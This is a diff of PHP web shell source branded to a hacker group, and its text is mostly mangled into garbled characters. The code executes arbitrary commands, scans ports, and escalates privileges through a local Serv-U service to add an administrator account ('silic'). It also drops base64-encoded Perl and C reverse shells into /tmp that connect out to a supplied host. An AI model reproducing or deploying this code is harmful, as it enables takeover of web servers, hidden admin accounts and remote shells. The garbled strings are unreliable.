+array("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½/ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½",date("Yï¿½ï¿½mï¿½ï¿½dï¿½ï¿½ h:i:s",time())."&nbsp;/&nbsp;".gmdate("Yï¿½ï¿½nï¿½ï¿½jï¿½ï¿½ H:i:s",time()+8*3600)),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:ï¿½Ë¿ï¿½(ip)","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>:".$_SERVER['SERVER_PORT']." ( ".gethostbyname($_SERVER['SERVER_NAME'])." )"),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÏµÍ³(ï¿½ï¿½ï¿½Ö±ï¿½ï¿½ï¿½)",PHP_OS." (".$_SERVER['HTTP_ACCEPT_LANGUAGE'].")"),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½",$_SERVER['SERVER_SOFTWARE']),
+array("ï¿½ï¿½ï¿½ï¿½IP",getenv('REMOTE_ADDR')),
+array("PHPï¿½ï¿½ï¿½Ð·ï¿½Ê½(ï¿½æ±¾)",strtoupper(php_sapi_name())."(".PHP_VERSION.") / ï¿½ï¿½È«Ä£Ê½:".Info_Cfg("safemode")),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô±",$adminmail),
+array("ï¿½ï¿½ï¿½Ä¼ï¿½Â·ï¿½ï¿½",__FILE__),
+array("ï¿½ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½URLï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½[allow_url_fopen]",Info_Cfg("allow_url_fopen")),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ì¬ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¿ï¿½[enable_dl]",Info_Cfg("enable_dl")),
+array("ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢[display_errors]",Info_Cfg("display_errors")),
+array("ï¿½Ô¶ï¿½ï¿½ï¿½È«ï¿½Ö±ï¿½ï¿½ï¿½[register_globals]",Info_Cfg("register_globals")),
+array("ï¿½Ô¶ï¿½ï¿½Ö·ï¿½ï¿½ï¿½×ªï¿½ï¿½[magic_quotes_gpc]",Info_Cfg("magic_quotes_gpc")),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½Ê¹ï¿½ï¿½ï¿½ï¿½[memory_limit]",Info_Cfg("memory_limit")),
+array("POSTï¿½ï¿½ï¿½ï¿½ï¿½Ö½ï¿½[post_max_size]",Info_Cfg("post_max_size")),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï´ï¿½[upload_max_filesize]",$upsize),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½î³¤ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½[max_execution_time]",Info_Cfg("max_execution_time")."ï¿½ï¿½"),
+array("ï¿½ï¿½ï¿½Ãºï¿½ï¿½ï¿½[disable_functions]",$dis_func),
+array("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½[phpinfo()]",$phpinfo),
+array("Ä¿Ç°ï¿½ï¿½ï¿½Ð¿ï¿½ï¿½ï¿½ï¿½Õ¼ï¿½diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
+array("GZÑ¹ï¿½ï¿½ï¿½Ä¼ï¿½Ö§ï¿½ï¿½[zlib]",Info_Fun("gzclose")),
+array("ZIPÑ¹ï¿½ï¿½ï¿½Ä¼ï¿½Ö§ï¿½ï¿½[ZipArchive(php_zip)]",Info_Fun("zip_open")),
+array("IMAPï¿½ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ÏµÍ³",Info_Fun("imap_close")),
+array("XMLï¿½ï¿½ï¿½ï¿½",Info_Fun("xml_set_object")),
+array("FTPï¿½ï¿½Â½",Info_Fun("ftp_login")),
+array("SessionÖ§ï¿½ï¿½",Info_Fun("session_start")),
+array("SocketÖ§ï¿½ï¿½",Info_Fun("fsockopen")),
+array("MySQLï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("mysql_close")),
+array("MSSQLï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("mssql_close")),
+array("Postgre SQLï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("pg_close")),
+array("SQLiteï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("sqlite_close")),
+array("Oracleï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("ora_close")),
+array("Oracle 8ï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("OCILogOff")),
+array("SyBaseï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("sybase_close")),
+array("Hyperwaveï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("hw_close")),
+array("InforMixï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("ifx_close")),
+array("FileProï¿½ï¿½ï¿½Ý¿ï¿½",Info_Fun("filepro_fieldcount")),
+array("DBA/DBMï¿½ï¿½ï¿½ï¿½",Info_Fun("dba_close")."&nbsp;/&nbsp;".Info_Fun("dbmclose")),
+array("ODBC/dBASEï¿½ï¿½ï¿½ï¿½",Info_Fun("odbc_close")."&nbsp;/&nbsp;".Info_Fun("dbase_close")),
+array("PRELï¿½ï¿½ï¿½ï¿½ï¿½ï·¨[PCRE]",Info_Fun("preg_match")),
+array("PDFÖ§ï¿½ï¿½",Info_Fun("pdf_close")),
+array("Í¼ï¿½Î´ï¿½ï¿½ï¿½[GD Library]",Info_Fun("imageline")),
+array("SNMPï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð­ï¿½ï¿½",Info_Fun("snmpget")),);
 echo '<table width="100%" border="0">';
 for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
 echo '</table>';
 return true;
 }
-//Ö´ÐÐÃüÁî
+//Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 function Exec_Run($cmd)
 {
 	$res = '';
@@ -789,7 +789,7 @@ function Exec_Run($cmd)
 }
 function Exec_g()
 {
-	$res = '»ØÏÔ';
+	$res = 'ï¿½ï¿½ï¿½ï¿½';
 	$cmd = 'dir';
 	if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}
 print<<<END
@@ -815,38 +815,38 @@ return true;
 }
 </script>
 <form method="POST" name="gform" id="gform" action="?s=g"><center><div class="actall">
-ÃüÁî²ÎÊý <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:399px;">
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:399px;">
 <select onchange='return sFull(options[selectedIndex].value)'>
-<option value="0" selected>--ÃüÁî¼¯ºÏ--</option>
-<option value="1">ÎÄ¼þÁÐ±í</option>
-<option value="2">¶ÁÈ¡ÅäÖÃ</option>
-<option value="3">¿½±´ÎÄ¼þ</option>
-<option value="4">ÏµÍ³ÐÅÏ¢</option>
-<option value="5">±àÒëÎÄ¼þ</option>
-<option value="6">Ìí¼Ó¹ÜÀí</option>
-<option value="7">ÓÃ»§ÁÐ±í</option>
-<option value="8">²é¿´¶Ë¿Ú</option>
-<option value="9">²é¿´µØÖ·</option>
-<option value="10">¸´ÖÆÎÄ¼þ</option>
-<option value="11">FTPÏÂÔØ</option>
-<option value="12">ÄÚºË°æ±¾</option>
-<option value="13">¸ü¸ÄÊôÐÔ</option>
+<option value="0" selected>--ï¿½ï¿½ï¿½î¼¯ï¿½ï¿½--</option>
+<option value="1">ï¿½Ä¼ï¿½ï¿½Ð±ï¿½</option>
+<option value="2">ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½</option>
+<option value="3">ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½</option>
+<option value="4">ÏµÍ³ï¿½ï¿½Ï¢</option>
+<option value="5">ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½</option>
+<option value="6">ï¿½ï¿½ï¿½Ó¹ï¿½ï¿½ï¿½</option>
+<option value="7">ï¿½Ã»ï¿½ï¿½Ð±ï¿½</option>
+<option value="8">ï¿½é¿´ï¿½Ë¿ï¿½</option>
+<option value="9">ï¿½é¿´ï¿½ï¿½Ö·</option>
+<option value="10">ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½</option>
+<option value="11">FTPï¿½ï¿½ï¿½ï¿½</option>
+<option value="12">ï¿½ÚºË°æ±¾</option>
+<option value="13">ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½</option>
 </select>
-<input type="submit" value="Ö´ÐÐ" style="width:80px;"></div>
+<input type="submit" value="Ö´ï¿½ï¿½" style="width:80px;"></div>
 <div class="actall"><textarea name="show" style="width:660px;height:399px;">{$res}</textarea></div></center></form>
 END;
 return true;
 }
-//É¨Ãè¶Ë¿Ú
+//É¨ï¿½ï¿½ï¿½Ë¿ï¿½
 function Port_i()
 {
 $Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';
 $Port_port = isset($_POST['port']) ? $_POST['port'] : '21|22|23|25|80|110|111|135|139|443|445|1433|1521|3306|3389|4899|5432|5631|7001|8000|8080|14147|43958';
 print<<<END
 <form method="POST" name="iform" id="iform" action="?s=i">
-<div class="actall">É¨ÃèIP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
-<div class="actall">¶Ë¿ÚºÅ <input type="text" name="port" value="{$Port_port}" style="width:720px;"></div>
-<div class="actall"><input type="submit" value="É¨Ãè" style="width:80px;"></div>
+<div class="actall">É¨ï¿½ï¿½IP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
+<div class="actall">ï¿½Ë¿Úºï¿½ <input type="text" name="port" value="{$Port_port}" style="width:720px;"></div>
+<div class="actall"><input type="submit" value="É¨ï¿½ï¿½" style="width:80px;"></div>
 </form>
 END;
 	if((!empty($_POST['ip'])) && (!empty($_POST['port'])))
@@ -856,7 +856,7 @@ END;
 		for($i = 0;$i < count($ports);$i++)
 		{
 			$fp = @fsockopen($_POST['ip'],$ports[$i],&$errno,&$errstr,2);
-			echo $fp ? '<font color="#FF0000">¿ª·Å¶Ë¿Ú ---> '.$ports[$i].'</font><br>' : '¹Ø±Õ¶Ë¿Ú ---> '.$ports[$i].'<br>';
+			echo $fp ? '<font color="#FF0000">ï¿½ï¿½ï¿½Å¶Ë¿ï¿½ ---> '.$ports[$i].'</font><br>' : 'ï¿½Ø±Õ¶Ë¿ï¿½ ---> '.$ports[$i].'<br>';
 			ob_flush();
 			flush();
 		}
@@ -869,30 +869,30 @@ function Servu_l()
 {
 $SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P';
 print<<<END
-<div class="actall"><a href="?s=l">[Ö´ÐÐÃüÁî]</a> <a href="?s=l&o=adduser">[Ìí¼ÓÓÃ»§]</a></div>
+<div class="actall"><a href="?s=l">[Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½]</a> <a href="?s=l&o=adduser">[ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½]</a></div>
 <form method="POST">
-	<div class="actall">ServU¶Ë¿Ú <input name="SUPort" type="text" value="43958" style="width:300px"></div>
-	<div class="actall">ServUÓÃ»§ <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
-	<div class="actall">ServUÃÜÂë <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
+	<div class="actall">ServUï¿½Ë¿ï¿½ <input name="SUPort" type="text" value="43958" style="width:300px"></div>
+	<div class="actall">ServUï¿½Ã»ï¿½ <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
+	<div class="actall">ServUï¿½ï¿½ï¿½ï¿½ <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
 END;
 if($_GET['o'] == 'adduser')
 {
 print<<<END
-<div class="actall">ÕÊºÅ <input name="user" type="text" value="yoco" style="width:200px">
-ÃÜÂë <input name="password" type="text" value="silic" style="width:200px">
+<div class="actall">ï¿½Êºï¿½ <input name="user" type="text" value="yoco" style="width:200px">
+ï¿½ï¿½ï¿½ï¿½ <input name="password" type="text" value="silic" style="width:200px">
 Ä¿Â¼ <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
 END;
 }
 else
 {
 print<<<END
-<div class="actall">ÌáÈ¨ÃüÁî <input name="SUCommand" type="text" value="net user silic silic /add & net localgroup administrators silic /add" style="width:600px"><br>
+<div class="actall">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ <input name="SUCommand" type="text" value="net user silic silic /add & net localgroup administrators silic /add" style="width:600px"><br>
 <input name="user" type="hidden" value="silic">
 <input name="password" type="hidden" value="silic">
 <input name="part" type="hidden" value="C:\\\\"></div>
 END;
 }
-echo '<div class="actall"><input type="submit" value="Ö´ÐÐ" style="width:80px;"></div></form>';
+echo '<div class="actall"><input type="submit" value="Ö´ï¿½ï¿½" style="width:80px;"></div></form>';
 	if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))
 	{
 		echo '<div class="actall">';
@@ -905,64 +905,64 @@ echo '<div class="actall"><input type="submit" value="Ö´ÐÐ" style="width:80px;">
 		$deldomain = "-DELETEDOMAIN\r\n"."-IP=0.0.0.0\r\n"." PortNo=21\r\n";
 		$sock = @fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
 		$recvbuf = @fgets($sock, 1024);
-		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 		$sendbuf = "USER ".$_POST["SUUser"]."\r\n";
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "·¢ËÍÊý¾Ý°ü: $sendbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 		$sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "·¢ËÍÊý¾Ý°ü: $sendbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 		$sendbuf = "SITE MAINTENANCE\r\n";
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "·¢ËÍÊý¾Ý°ü: $sendbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 		$sendbuf = $domain;
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "·¢ËÍÊý¾Ý°ü: $sendbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 		$sendbuf = $adduser;
 		@fputs($sock, $sendbuf, strlen($sendbuf));
-		echo "·¢ËÍÊý¾Ý°ü: $sendbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $sendbuf <br>";
 		$recvbuf = @fgets($sock, 1024);
-		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 		if(!empty($_POST['SUCommand']))
 		{
 	 		$exp = @fsockopen("127.0.0.1", "21", &$errno, &$errstr, 10);
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 	 		$sendbuf = "USER ".$_POST['user']."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "·¢ËÍÊý¾Ý°ü: $sendbuf <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $sendbuf <br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 	 		$sendbuf = "PASS ".$_POST['password']."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "·¢ËÍÊý¾Ý°ü: $sendbuf <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $sendbuf <br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 	 		$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
 	 		@fputs($exp, $sendbuf, strlen($sendbuf));
-	 		echo "·¢ËÍÊý¾Ý°ü: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>";
 	 		$recvbuf = @fgets($exp, 1024);
-	 		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 	 		$sendbuf = $deldomain;
 	 		@fputs($sock, $sendbuf, strlen($sendbuf));
-	 		echo "·¢ËÍÊý¾Ý°ü: $sendbuf <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $sendbuf <br>";
 	 		$recvbuf = @fgets($sock, 1024);
-	 		echo "·µ»ØÊý¾Ý°ü: $recvbuf <br>";
+	 		echo "ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ý°ï¿½: $recvbuf <br>";
 	 		@fclose($exp);
 		}
 		@fclose($sock);
 		echo '</div>';
 	}
 }
-//·´µ¯Á¬½Ó
+//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 function backconn()
 {
 $ty=$_GET['ty'];
@@ -981,10 +981,10 @@ $port = $_POST['port'];
 }else{
 print<<<END
 <div class="actall"><form method=post action="?s=dd&ty=socket">
-<br>Ö÷»úÀàÐÍ:<input type="radio" name=info value="linux">Linux <input type="radio" name=info value="win" checked>Windows<br><br>
-Ö÷»ú£º<input type=text name=host value=""><br>
-¶Ë¿Ú£º<input type=text name=port value="1120"><br><br>
-<input class="bt" type=submit name=submit value="·´µ¯Á¬½Ó"><br><br></form></div>
+<br>ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:<input type="radio" name=info value="linux">Linux <input type="radio" name=info value="win" checked>Windows<br><br>
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<input type=text name=host value=""><br>
+ï¿½Ë¿Ú£ï¿½<input type=text name=port value="1120"><br><br>
+<input class="bt" type=submit name=submit value="ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½"><br><br></form></div>
 END;
 }
 if($system=="WIN"){$env=array('path' => 'c:\\windows\\system32');}
@@ -992,10 +992,10 @@ else{$env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/s
 $descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"),);
 $host=gethostbyname($host);
 $proto=getprotobyname("tcp");
-if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0){die("Socket´´½¨Ê§°Ü");}
-if(($ret=socket_connect($sock,$host,$port))<0){die("Á¬½ÓÊ§°Ü");}
+if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0){die("Socketï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½");}
+if(($ret=socket_connect($sock,$host,$port))<0){die("ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½");}
 else{
-$message=" Silic Group Hacker Army - BlackBap.Org - PHP·´µ¯Á¬½Ó\n";
+$message=" Silic Group Hacker Army - BlackBap.Org - PHPï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\n";
 socket_write($sock,$message,strlen($message));
 $cwd=str_replace('\\','/',dirname(__FILE__));
 while($cmd=socket_read($sock,65535,$proto))
@@ -1022,10 +1022,10 @@ $yourip = isset($_POST['yourip']) ? $_POST['yourip'] : getenv('REMOTE_ADDR');
 $yourport = isset($_POST['yourport']) ? $_POST['yourport'] : '12666';
 print<<<END
 <div class="actall"><form method="POST" name="kform" id="kform" action="?s=dd&ty=linux">
-<br>ÄãµÄµØÖ· <input type="text" name="yourip" value="{$yourip}" style="width:400px"><br>
-Á¬½Ó¶Ë¿Ú <input type="text" name="yourport" value="12666" style="width:400px"><br>
-Ö´ÐÐ·½Ê½ <select name="use"><option value="perl">perl</option><option value="c">c</option></select>&nbsp;&nbsp;
-<input type="submit" value="·´µ¯Á¬½Ó" style="width:80px;"><br><br><br></form></div>
+<br>ï¿½ï¿½ï¿½Äµï¿½Ö· <input type="text" name="yourip" value="{$yourip}" style="width:400px"><br>
+ï¿½ï¿½ï¿½Ó¶Ë¿ï¿½ <input type="text" name="yourport" value="12666" style="width:400px"><br>
+Ö´ï¿½Ð·ï¿½Ê½ <select name="use"><option value="perl">perl</option><option value="c">c</option></select>&nbsp;&nbsp;
+<input type="submit" value="ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½" style="width:80px;"><br><br><br></form></div>
 END;
 if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
 {
@@ -1033,49 +1033,49 @@ echo '<div class="actall">';
 if($_POST['use'] == 'perl')
 {
 $back_connect_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
-echo File_Write('/tmp/yoco_bc',base64_decode($back_connect_pl),'wb') ? '´´½¨/tmp/yoco_bc³É¹¦<br>' : '´´½¨/tmp/yoco_bcÊ§°Ü<br>';
+echo File_Write('/tmp/yoco_bc',base64_decode($back_connect_pl),'wb') ? 'ï¿½ï¿½ï¿½ï¿½/tmp/yoco_bcï¿½É¹ï¿½<br>' : 'ï¿½ï¿½ï¿½ï¿½/tmp/yoco_bcÊ§ï¿½ï¿½<br>';
 $perlpath = Exec_Run('which perl');
 $perlpath = $perlpath ? chop($perlpath) : 'perl';
-echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Ö´ÐÐÃüÁîÊ§°Ü';
+echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½';
 }
 if($_POST['use'] == 'c')
 {
 $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJybSAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7DQogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
-echo File_Write('/tmp/yoco_bc.c',base64_decode($back_connect_c),'wb') ? '´´½¨/tmp/yoco_bc.c³É¹¦<br>' : '´´½¨/tmp/yoco_bc.cÊ§°Ü<br>';
+echo File_Write('/tmp/yoco_bc.c',base64_decode($back_connect_c),'wb') ? 'ï¿½ï¿½ï¿½ï¿½/tmp/yoco_bc.cï¿½É¹ï¿½<br>' : 'ï¿½ï¿½ï¿½ï¿½/tmp/yoco_bc.cÊ§ï¿½ï¿½<br>';
 $res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
 @unlink('/tmp/yoco.c');
-echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Ö´ÐÐÃüÁîÊ§°Ü';
+echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : 'Ö´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½';
 }
-echo '<br>Äã¿ÉÒÔ³¢ÊÔÁ¬½Ó¶Ë¿Ú (nc -l -n -v -p '.$_POST['yourport'].') </div>';
+echo '<br>ï¿½ï¿½ï¿½ï¿½ï¿½Ô³ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¶Ë¿ï¿½ (nc -l -n -v -p '.$_POST['yourport'].') </div>';
 }
 return true;
 }else{
 print<<<END
 <div class="actall"><pre>
-<br><a href="?s=dd&ty=linux"> [ C/Perl ·´µ¯ - Linux ] </a><br><br>
-<h5>±¾¹²ÄÜÓÃÓÚlinuxÌáÈ¨ÖÐµÄ·´ÏòcmdÁ¬½Ó¡£<br>
-Ô­ÀíÊÇ½«·´µ¯Á¬½Ó¹¦ÄÜµÄperl½Å±¾»òÕßC³ÌÐòÐ´Èë/tmpÎÄ¼þ¼Ð²¢ÔËÐÐ<br>
-Èôphp½ûÓÃÁËÃüÁîÖ´ÐÐº¯Êý½«¿ÉÄÜµ¼ÖÂ·´µ¯Ê§°Ü<br>
